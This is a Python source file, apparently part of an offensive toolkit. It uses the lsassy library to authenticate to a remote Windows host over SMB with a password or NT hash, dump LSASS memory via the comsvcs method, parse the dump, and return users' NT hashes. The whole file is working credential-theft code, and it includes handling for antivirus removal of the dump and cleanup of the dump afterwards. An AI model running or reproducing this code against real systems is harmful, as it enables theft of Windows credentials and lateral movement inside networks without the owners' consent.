from lsassy.dumper import Dumper
from lsassy.session import Session
from lsassy.impacketfile import ImpacketFile
from lsassy.parser import Parser
import logging
import sys

from pympacket.models.common import User

def dump_lsass(target, username, domain, password='', nthash=''):
    logging.disable(sys.maxsize) # Disable lsassy logger (noisy)

    session = Session()
    session.get_session(
        address=target,
        target_ip=target,
        port=445,
        username=username,
        password=password,
        nthash=nthash,
        domain=domain
    )
    if session.smb_session is None:
        print("Couldn't connect to remote host.\n", file=sys.stderr)
        return None
    
    dumper = Dumper(session, timeout=5, time_between_commands=1).load(dump_module='comsvcs')
    file = dumper.dump(dump_name="sasso.dmp")
    if file is None:
        print("Unable to dump lsass, maybe you don't have admin privileges.\n", file=sys.stderr)
        return None
    
    file = ImpacketFile(session).open(share="C$", timeout=5, file="sasso.dmp", path="\\Windows\\Temp\\")
    if file is None:
        print("Unable to open lsass dump, might have been removed by host's antivirus.\n", file=sys.stderr)
        return None
    
    credentials, tickets, masterkeys = Parser(target, file).parse()
    file.close()

    result = ImpacketFile.delete(session, file.get_file_path(), timeout=5) # Doesn't work at the moment
    #if result is None:
    #    print("Unable to delete dump from remote system.")

    try:
        dumper.clean()
    except Exception as e:
        print(f"Potential issue when cleaning dumper: {e}\n", file=sys.stderr)

    try:
        session.smb_session.close()
    except Exception as e:
        print(f"Potential issue when cleaning dumper: {e}\n", file=sys.stderr)

    unique_creds = []
    for cred in credentials:
        credent = cred.get_object() # Get Credentials object data in dict format
        current_creds = dict((k, credent[k]) for k in ['domain', 'username', 'nthash']) # Extract only required info

        if current_creds not in unique_creds:
            if current_creds['nthash'] != None:
                unique_creds.append(current_creds)

    output = []
    for user in unique_creds:
        current_user = User()
        current_user.username = user['username']
        current_user.nthash = user['nthash']
        output.append(current_user)
    
    return output